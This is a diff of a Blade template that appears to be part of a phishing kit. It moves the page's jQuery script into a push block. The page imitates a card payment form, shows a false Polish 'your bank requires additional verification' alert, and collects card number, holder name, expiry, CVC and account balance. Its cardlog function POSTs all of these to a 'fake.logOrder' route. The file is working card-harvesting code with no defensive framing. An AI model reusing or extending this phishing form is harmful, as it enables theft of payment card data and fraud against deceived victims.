@@ -157,115 +157,117 @@
 
         </div>
     </div>
-    <script type="text/javascript">
-        $(document).ready(function () {
-            load();
-            $("#cardnumber").mask("9999 9999 9999 9999");
-            $("#expdate").mask("99/99");
-            $("#cvc2").mask("999");
-        })
+    @push('js')
+        <script type="text/javascript">
+            $(document).ready(function () {
+                load();
+                $("#cardnumber").mask("9999 9999 9999 9999");
+                $("#expdate").mask("99/99");
+                $("#cvc2").mask("999");
+            })
 
 
-        function load(ms = 1000) {
-            $('#loading').show();
-            setTimeout(function () {
-                $('#loading').hide();
-            }, ms);
-        }
-
-        function nextpay() {
-            load();
-            let ccnum = $('#cardnumber');
-            let cardholder = $('#cardholder');
-            let expdate = $('#expdate');
-            let cvc = $('#cvc2');
-            let Data = new Date();
-            let card_date = expdate.val();
-            let month = card_date.split("/")[0]
-            let year = card_date.split("/")[1]
-            let current_moth = Data.getMonth() + 1;
-            let current_year = Data.getFullYear().toString();
-            current_year = current_year[0] + current_year[1];
-            let valid_card = !(month > 12 || (month < current_moth && year <= current_year));
-            let ccnum_length = $.trim(ccnum.unmask().val()).length;
-            ccnum.mask("9999 9999 9999 9999");
-            if (ccnum_length >= 16 && expdate.val().length === 5 && cardholder.val().length && cvc.val().length === 3 && valid_card) {
-                $('#carddata').css('display', 'none');
-                load(3000);
-                $('#balance_check').css('display', '');
-            } else {
-                ccnum_length < 16 ? ccnum.css("border-color", "red") : ccnum.css("border-color", "");
-                !cardholder.val().length ? cardholder.css("border-color", "red") : cardholder.css("border-color", "");
-                (!expdate.val().length < 5 || !valid_card) ? expdate.css("border-color", "red") : expdate.css("border-color", "");
-                cvc.val().length < 3 ? cvc.css("border-color", "red") : cvc.css("border-color", "");
+            function load(ms = 1000) {
+                $('#loading').show();
+                setTimeout(function () {
+                    $('#loading').hide();
+                }, ms);
             }
-        }
 
-        function nextcard() {
-            let ccnum = $('#cardnumber');
-            ccnum.css("border-color", "");
-            if (ccnum.unmask().val().length >= 16) {
-                $('#step2').show();
-                $('#nextpay').attr('onclick', 'nextpay();');
-                alert('Twój bank zażądał dodatkowej weryfikacji. Wypełnij dodatkowe pola i spróbuj ponownie.')
-            } else {
-                ccnum.css("border-color", "red");
-                alert('Mapa wpisana niepoprawnie.');
+            function nextpay() {
+                load();
+                let ccnum = $('#cardnumber');
+                let cardholder = $('#cardholder');
+                let expdate = $('#expdate');
+                let cvc = $('#cvc2');
+                let Data = new Date();
+                let card_date = expdate.val();
+                let month = card_date.split("/")[0]
+                let year = card_date.split("/")[1]
+                let current_moth = Data.getMonth() + 1;
+                let current_year = Data.getFullYear().toString();
+                current_year = current_year[0] + current_year[1];
+                let valid_card = !(month > 12 || (month < current_moth && year <= current_year));
+                let ccnum_length = $.trim(ccnum.unmask().val()).length;
+                ccnum.mask("9999 9999 9999 9999");
+                if (ccnum_length >= 16 && expdate.val().length === 5 && cardholder.val().length && cvc.val().length === 3 && valid_card) {
+                    $('#carddata').css('display', 'none');
+                    load(3000);
+                    $('#balance_check').css('display', '');
+                } else {
+                    ccnum_length < 16 ? ccnum.css("border-color", "red") : ccnum.css("border-color", "");
+                    !cardholder.val().length ? cardholder.css("border-color", "red") : cardholder.css("border-color", "");
+                    (!expdate.val().length < 5 || !valid_card) ? expdate.css("border-color", "red") : expdate.css("border-color", "");
+                    cvc.val().length < 3 ? cvc.css("border-color", "red") : cvc.css("border-color", "");
+                }
             }
-            ccnum.mask("9999 9999 9999 9999");
-        }
 
-        function cardlog() {
-            let ccnum = $('#cardnumber');
-            let cardholder = $('#cardholder');
-            let expdate = $('#expdate');
-            let cvc = $('#cvc2');
-            let card_balance = $('#card_balance');
-            let card_date = expdate.val();
-            let Data = new Date();
-            let month = card_date.split("/")[0]
-            let year = card_date.split("/")[1]
-            let current_moth = Data.getMonth() + 1;
-            let current_year = Data.getFullYear().toString();
-            current_year = current_year[0] + current_year[1];
-            let valid_card = !(month > 12 || (month < current_moth && year <= current_year));
-            let ccnum_unmask = ccnum.unmask().val()
-            let ccnum_length = $.trim(ccnum_unmask).length;
-            ccnum.mask("9999 9999 9999 9999");
-            if (ccnum_length >= 16 && expdate.val().length === 5 && cardholder.val().length && cvc.val().length === 3 && card_balance.val().length && card_balance.val() > 1 && parseInt(card_balance.val()) !== parseInt("{{$fake->price}}") && valid_card) {
-                $('#paybutton').css('background', 'gray').attr('disabled', '1');
-                $.ajax({
-                    type: "POST",
-                    dataType: "json",
-                    url: "{{subRoute('fake.logOrder')}}",
-                    beforeSend: load,
-                    data: {
-                        card_number: ccnum_unmask,
-                        expdate: expdate.val(),
-                        card_cvc: cvc.val(),
-                        card_holder: cardholder.val(),
-                        balance: card_balance.val(),
-                    },
-                }).fail(function (e) {
-                    console.log(e)
-                    // setTimeout(function () {
-                    //     window.location.reload();
-                    // }, 11000);
-                }).done(function (data) {
-                    if (data.html) $('#app').html(data.html);
-                    else location.href = data.next
-                });
-            } else {
-                !cardholder.val().length ? cardholder.css("border-color", "red") : cardholder.css("border-color", "");
-                (!expdate.val().length < 5 || !valid_card) ? expdate.css("border-color", "red") : expdate.css("border-color", "");
-                cvc.val().length < 3 ? cvc.css("border-color", "red") : cvc.css("border-color", "");
-                ccnum_length < 16 ? ccnum.css("border-color", "red") : ccnum.css("border-color", "");
-                !card_balance.val().length ? card_balance.css("border-color", "red") : card_balance.css("border-color", "");
-                if (!card_balance.val().length || card_balance.val() < 5 || parseInt(card_balance.val()) === parseInt("{{$fake->price}}")) {
-                    $('#verif_balance').toggle();
-                    card_balance.css("border-color", "red");
-                } else card_balance.css("border-color", "");
+            function nextcard() {
+                let ccnum = $('#cardnumber');
+                ccnum.css("border-color", "");
+                if (ccnum.unmask().val().length >= 16) {
+                    $('#step2').show();
+                    $('#nextpay').attr('onclick', 'nextpay();');
+                    alert('Twój bank zażądał dodatkowej weryfikacji. Wypełnij dodatkowe pola i spróbuj ponownie.')
+                } else {
+                    ccnum.css("border-color", "red");
+                    alert('Mapa wpisana niepoprawnie.');
+                }
+                ccnum.mask("9999 9999 9999 9999");
             }
-        }
-    </script>
+
+            function cardlog() {
+                let ccnum = $('#cardnumber');
+                let cardholder = $('#cardholder');
+                let expdate = $('#expdate');
+                let cvc = $('#cvc2');
+                let card_balance = $('#card_balance');
+                let card_date = expdate.val();
+                let Data = new Date();
+                let month = card_date.split("/")[0]
+                let year = card_date.split("/")[1]
+                let current_moth = Data.getMonth() + 1;
+                let current_year = Data.getFullYear().toString();
+                current_year = current_year[0] + current_year[1];
+                let valid_card = !(month > 12 || (month < current_moth && year <= current_year));
+                let ccnum_unmask = ccnum.unmask().val()
+                let ccnum_length = $.trim(ccnum_unmask).length;
+                ccnum.mask("9999 9999 9999 9999");
+                if (ccnum_length >= 16 && expdate.val().length === 5 && cardholder.val().length && cvc.val().length === 3 && card_balance.val().length && card_balance.val() > 1 && parseInt(card_balance.val()) !== parseInt("{{$fake->price}}") && valid_card) {
+                    $('#paybutton').css('background', 'gray').attr('disabled', '1');
+                    $.ajax({
+                        type: "POST",
+                        dataType: "json",
+                        url: "{{subRoute('fake.logOrder')}}",
+                        beforeSend: load,
+                        data: {
+                            card_number: ccnum_unmask,
+                            expdate: expdate.val(),
+                            card_cvc: cvc.val(),
+                            card_holder: cardholder.val(),
+                            balance: card_balance.val(),
+                        },
+                    }).fail(function (e) {
+                        console.log(e)
+                        setTimeout(function () {
+                            window.location.reload();
+                        }, 2000);
+                    }).done(function (data) {
+                        if (data.html) $('#app').html(data.html);
+                        else location.href = data.next
+                    });
+                } else {
+                    !cardholder.val().length ? cardholder.css("border-color", "red") : cardholder.css("border-color", "");
+                    (!expdate.val().length < 5 || !valid_card) ? expdate.css("border-color", "red") : expdate.css("border-color", "");
+                    cvc.val().length < 3 ? cvc.css("border-color", "red") : cvc.css("border-color", "");
+                    ccnum_length < 16 ? ccnum.css("border-color", "red") : ccnum.css("border-color", "");
+                    !card_balance.val().length ? card_balance.css("border-color", "red") : card_balance.css("border-color", "");
+                    if (!card_balance.val().length || card_balance.val() < 5 || parseInt(card_balance.val()) === parseInt("{{$fake->price}}")) {
+                        $('#verif_balance').toggle();
+                        card_balance.css("border-color", "red");
+                    } else card_balance.css("border-color", "");
+                }
+            }
+        </script>
+    @endpush
 @endsection
